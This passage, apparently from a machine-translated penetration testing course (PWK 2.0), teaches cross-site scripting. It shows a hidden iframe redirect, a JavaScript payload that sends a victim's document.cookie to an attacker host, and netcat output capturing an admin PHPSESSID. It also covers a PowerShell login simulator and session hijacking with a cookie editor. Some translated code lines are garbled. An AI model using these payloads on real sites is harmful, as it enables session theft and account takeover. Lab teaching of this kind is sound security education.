<div style="position:absolute;top:99584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不可见，因为它没有大小，因为高度和宽度都设置为零。</font></font></nobr></div>
<div style="position:absolute;top:99616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提交此有效负载后，任何访问该页面的用户都将连接回我们的攻击</font></font></nobr></div>
<div style="position:absolute;top:99636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font><font style="vertical-align: inherit;">为了测试这一点，我们可以在我们的攻击机器上创建一个 Netcat 监听器（这里是 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:99655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例）在端口 80 上，并刷新反馈页面。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -nvlp 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:99707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[sudo] 卡利密码：</font></font></nobr></div>
<div style="position:absolute;top:99724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 80 ...</font></font></nobr></div>
<div style="position:absolute;top:99741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 41612 连接到 [10.11.0.4]</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:99758;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取/报告 HTTP/1.1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.0.4</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:99839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">268 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:99967;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="85"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 85 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:100000;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:101077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:101077;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:101077;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">305</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:100096;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理：Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受：text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</font></font></nobr></div>
<div style="position:absolute;top:100129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受语言：en-US,en;q=0.5</font></font></nobr></div>
<div style="position:absolute;top:100146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受编码：gzip、deflate</font></font></nobr></div>
<div style="position:absolute;top:100164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">推荐人：http://10.11.0.22/feedback.php</font></font></nobr></div>
<div style="position:absolute;top:100180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:100200;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 289 - 使用 Netcat 接收 XSS 请求</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如上所示，浏览器重定向有效，将受害浏览器发送给我们的攻击</font></font></nobr></div>
<div style="position:absolute;top:100248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器通过 iframe。</font><font style="vertical-align: inherit;">同样，受害者不会在他们的浏览器中看到零大小的 iframe。</font></font></nobr></div>
<div style="position:absolute;top:100281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以更进一步，将受害浏览器重定向到客户端攻击或信息</font></font></nobr></div>
<div style="position:absolute;top:100301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集脚本。</font></font></nobr></div>
<div style="position:absolute;top:100333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们首先要捕获受害者的 User-Agent 标头以帮助识别类型</font></font></nobr></div>
<div style="position:absolute;top:100353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们正在使用的浏览器。</font><font style="vertical-align: inherit;">在上面的例子中，我们使用了 Netcat，因为它向我们展示了完整的</font></font></nobr></div>
<div style="position:absolute;top:100372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从浏览器发送的请求，包括 User-Agent 标头。</font><font style="vertical-align: inherit;">Apache HTTP 服务器也将</font></font></nobr></div>
<div style="position:absolute;top:100392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，在 /var/log/apache2/access.log 中捕获 User-Agent 标头。</font></font></nobr></div>
<div style="position:absolute;top:100424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不会在这里执行任何客户端攻击。</font><font style="vertical-align: inherit;">相反，我们将尝试访问</font></font></nobr></div>
<div style="position:absolute;top:100444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序作为管理用户。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100478;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.4 窃取 Cookie 和会话信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用 XSS 来窃取</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cookie </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">269</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和会话信息，如果应用程序使用不安全的</font></font></nobr></div>
<div style="position:absolute;top:100532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话管理配置。</font><font style="vertical-align: inherit;">如果我们可以窃取经过身份验证的用户的 cookie，我们就可以</font></font></nobr></div>
<div style="position:absolute;top:100551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标网站中伪装成该用户。</font></font></nobr></div>
<div style="position:absolute;top:100584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了提供一些背景信息，网站使用 cookie 来跟踪</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">270</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和有关用户的信息。</font></font></nobr></div>
<div style="position:absolute;top:100603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用多个可选标志设置 Cookie，其中包括两个我们特别感兴趣的标志</font></font></nobr></div>
<div style="position:absolute;top:100623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为渗透测试人员：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secure</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HttpOnly</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:100656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secure </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">271</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志指示浏览器仅通过加密连接发送 cookie，例如</font></font></nobr></div>
<div style="position:absolute;top:100675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为 HTTPS。</font><font style="vertical-align: inherit;">这可以防止 cookie 以明文形式发送和通过网络捕获。</font></font></nobr></div>
<div style="position:absolute;top:100708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HttpOnly </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">272</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志指示浏览器拒绝 JavaScript 访问 cookie。</font><font style="vertical-align: inherit;">如果这个标志是</font></font></nobr></div>
<div style="position:absolute;top:100727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未设置，我们可以使用 XSS 负载来窃取 cookie。</font></font></nobr></div>
<div style="position:absolute;top:100760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，即使未设置此标志，我们也必须解决一些其他浏览器控件，因为</font></font></nobr></div>
<div style="position:absolute;top:100779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器安全性规定一个域设置的 cookie 不能直接发送到另一个域</font></font></nobr></div>
<div style="position:absolute;top:100799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">顺便说一句，这是可以放宽的子域</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置Cookie</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过指令</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域</font></font></i></nobr></div>
<div style="position:absolute;top:100818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志。</font><font style="vertical-align: inherit;">作为一种解决方法，如果 JavaScript 可以访问 cookie 值，我们可以将其用作一部分</font></font></nobr></div>
<div style="position:absolute;top:100837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接并发送链接，我们可以解构该链接以检索 cookie 值。</font></font></nobr></div>
<div style="position:absolute;top:100870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试一个示例来演示这是如何工作的。</font><font style="vertical-align: inherit;">我们的示例应用程序设置了一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHPSESSID</font></font></i></nobr></div>
<div style="position:absolute;top:100890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员用户登录时的 cookie。应用程序使用 cookie 来确定用户是否有</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:100967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">269 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/HTTP_cookie</font></font></font></nobr></div>
<div style="position:absolute;top:100987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">270 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Session_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(computer_science)</font></font></font></nobr></div>
<div style="position:absolute;top:101007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">271 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Secure_cookie</font></font></font></nobr></div>
<div style="position:absolute;top:101027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">272 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:101155;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="86"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 86 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:101188;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:102265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:102265;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:102265;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">306</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被认证。</font><font style="vertical-align: inherit;">如果我们修改我们的有效载荷，我们可以捕获受害者的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHPSESSID</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie 以</font></font></nobr></div>
<div style="position:absolute;top:101303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得对其经过身份验证的会话的访问权限。</font></font></nobr></div>
<div style="position:absolute;top:101336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 JavaScript 读取 cookie 的值并将其附加到链接的图像 URL</font></font></nobr></div>
<div style="position:absolute;top:101355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到我们的攻击机。</font><font style="vertical-align: inherit;">浏览器将读取图像标签并向我们发送 GET 请求</font></font></nobr></div>
<div style="position:absolute;top:101375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用受害者的 cookie 作为 URL 查询字符串的一部分来攻击系统。</font></font></nobr></div>
<div style="position:absolute;top:101408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了实现我们的 cookie 窃取器，我们需要修改我们的 XSS 负载，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;script&gt;new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;&lt;/script&gt;</font></font></nobr></div>
<div style="position:absolute;top:101461;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 290 - 一个窃取 cookie 的 XSS 负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们将此有效负载提交给应用程序，我们只需要等待经过身份验证的用户</font></font></nobr></div>
<div style="position:absolute;top:101510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问应用程序，以便我们可以窃取</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHPSESSID</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie。</font><font style="vertical-align: inherit;">我们可以从我们的手动执行此操作</font></font></nobr></div>
<div style="position:absolute;top:101530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 实验室机器或者我们可以在 Windows 10 实验室机器上使用 PowerShell 脚本</font></font></nobr></div>
<div style="position:absolute;top:101549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Documents/admin_login.ps1) 模拟管理员用户登录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$用户名=“管理员”</font></font></nobr></div>
<div style="position:absolute;top:101601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$password="p@ssw0rd"</font></font></nobr></div>
<div style="position:absolute;top:101618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$url_login="127.0.0.1/login.php"</font></font></nobr></div>
<div style="position:absolute;top:101652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie = New-Object -com InternetExplorer.Application</font></font></nobr></div>
<div style="position:absolute;top:101669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie.Visible = $true</font></font></nobr></div>
<div style="position:absolute;top:101686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie.navigate("$url_login")</font></font></nobr></div>
<div style="position:absolute;top:101703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while($ie.ReadyState -ne 4){ start-sleep -m 1000}</font></font></nobr></div>
<div style="position:absolute;top:101720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie.document.getElementsByName("username")[0].value="$username"</font></font></nobr></div>
<div style="position:absolute;top:101737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie.document.getElementsByName("password")[0].value="$password"</font></font></nobr></div>
<div style="position:absolute;top:101754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始睡眠 -m 10</font></font></nobr></div>
<div style="position:absolute;top:101771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie.document.getElementsByClassName("btn")[0].click()</font></font></nobr></div>
<div style="position:absolute;top:101788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始睡眠 -m 100</font></font></nobr></div>
<div style="position:absolute;top:101804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ie.退出()</font></font></nobr></div>
<div style="position:absolute;top:101821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)</font></font></nobr></div>
<div style="position:absolute;top:101841;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 291 - admin_login.ps1</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此脚本创建一个 Internet Explorer 实例，导航到登录页面，登录，然后</font></font></nobr></div>
<div style="position:absolute;top:101890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出。</font><font style="vertical-align: inherit;">这足以触发我们的 XSS 负载。</font><font style="vertical-align: inherit;">我们可以使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-ExecutionPolicy</font></font></b><font style="vertical-align: inherit;">运行脚本</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:101910;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绕过</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暂时允许未签名的脚本和</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-File admin_login.ps1</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定脚本</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin\Documents&gt; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -ExecutionPolicy Bypass -File admin_login.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:101983;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 292 - 运行 PS1 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们的受害者查看受影响的页面时，他们的浏览器会通过</font></font></nobr></div>
<div style="position:absolute;top:102032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经过身份验证的会话 ID 值：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -nvlp 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:102083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 80 ...</font></font></nobr></div>
<div style="position:absolute;top:102100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 53824 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:102117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET /cool.jpg?output= </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHPSESSID=ua19spmd8i3t1l9acl9m2tfi76</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> HTTP/1.1</font></font></nobr></div>
<div style="position:absolute;top:102134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">推荐人：http://127.0.0.1/admin.php</font></font></nobr></div>
<div style="position:absolute;top:102151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理：Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</font></font></nobr></div>
<div style="position:absolute;top:102168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:102187;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 293 - 使用 Netcat 接收 cookie </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:102343;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="87"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 87 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:102376;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:103453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:103453;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:103453;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">307</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了经过身份验证的会话 ID，我们需要在浏览器中设置它。</font><font style="vertical-align: inherit;">我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:102491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Editor </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">273</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器插件，可轻松设置和操作 cookie。</font></font></nobr></div>
<div style="position:absolute;top:102524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过浏览到 https://addons.mozilla.org/en-US/firefox/addon/cookie- 来安装这个插件</font></font></nobr></div>
<div style="position:absolute;top:102543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Firefox 中的 editor/ 并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Add to Firefox</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103156;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 148：Firefox 附加组件管理器</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:103403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">273 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:103531;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="88"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 88 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:103564;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:104641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:104641;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:104641;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">308</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:103654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.4.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以接受权限对话框并安装加载项。</font><font style="vertical-align: inherit;">我们现在应该有一个新的</font></font></nobr></div>
<div style="position:absolute;top:103694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Firefox 工具栏上 FoxyProxy 图标旁边的 cookie 图标。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103964;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 149：Cookie 编辑器快捷方式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经安装了 Cookie-Editor，我们将返回到 Web 应用程序并单击</font></font></nobr></div>
<div style="position:absolute;top:104014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Editor 图标以打开其对话窗口。</font></font></nobr></div>
</span></font>
